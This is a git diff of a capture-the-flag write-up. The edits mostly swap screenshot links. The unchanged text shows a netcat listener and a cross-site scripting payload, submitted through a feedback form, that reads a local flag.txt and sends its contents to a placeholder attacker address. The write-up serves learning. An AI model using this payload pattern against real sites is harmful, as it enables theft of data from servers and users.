@@ -19,7 +19,8 @@ The first step I took is to visit the website and looked for the source and foun
 
 And I visited to **``/submit_feedback``** and found a submition functionality available.
 
-<img width="1000" alt="Screenshot from 2025-01-03 07-33-51" src="https://github.com/user-attachments/assets/7180ce37-e12d-430e-9481-b9236d30d07d" />
+<img width="1000" alt="Screenshot from 2025-01-03 07-33-51" src="https://github.com/user-attachments/assets/0f94ce61-f51c-4e6c-afdd-99ee943ce345" />
+
 
 <img width="1000" align="catppuccin line" src="https://github.com/user-attachments/assets/8a04c1c1-9f58-4f23-9548-4c71971b3576" />
 
@@ -37,10 +38,12 @@ And I just ``nc`` the headers before the submition of the payload, and yeah like
 ```bash
 nc -knvlp 8080
 ```
-| ![Screenshot from 2025-01-03 08-10-35](https://github.com/user-attachments/assets/16818b62-29b4-428f-bfb6-a7df43471f59) | ![Screenshot from 2025-01-03 08-08-40](https://github.com/user-attachments/assets/122afe12-63cb-4e5c-a3f4-f140ab4fa642) |
+
+| ![Screenshot from 2025-01-03 08-10-35](https://github.com/user-attachments/assets/dd775ed6-f065-4a75-b271-1ee69639c288) | ![Screenshot from 2025-01-03 08-08-40](https://github.com/user-attachments/assets/ba98eb99-9e6f-452a-8058-fcee51bed3e4) |
 | --- | --- |
 <img width="1000" align="catppuccin line" src="https://github.com/user-attachments/assets/8a04c1c1-9f58-4f23-9548-4c71971b3576" />
 Now to grab the flag I have used the following payload..
+
 
 ```js
 <img src="x" onerror="fetch('http://127.0.0.1:8080/flag.txt').then(r => r.text()).then(r => fetch('http://<ip>:8080/?c=' + r)).catch(e => fetch('http://<ip>:8080/?c=' + e))"/>
@@ -53,7 +56,7 @@ Now to grab the flag I have used the following payload..
 * ```.then(r => fetch('http://<ip>:8080/?c=' + r))``` - After retrieving the file content, another ``fetch`` request sends the content (``r``) to the attacker's server (``http://<ip>:8080``) as part of the query string (``?c=...``).
 * ```.catch(e => fetch('http://<ip>:8080/?c=' + e))``` - If the initial ``fetch`` fails (e.g., the file doesn't exist or CORS blocks the request), the ``catch`` block handles the error and sends the error message (``e``) to the attacker's server.
 <img width="1000" align="catppuccin line" src="https://github.com/user-attachments/assets/8a04c1c1-9f58-4f23-9548-4c71971b3576" />
-<img width="1000" alt="flag png" src="https://github.com/user-attachments/assets/f78b265d-6508-4b29-948d-77f0af9e3d58" />
+<img width="1000"  alt="flag png" src="https://github.com/user-attachments/assets/6d86b886-7eed-492d-86c9-05cb9a1b6d09" />
 
 ***Yes! Thank you for reading till here ;)***
 
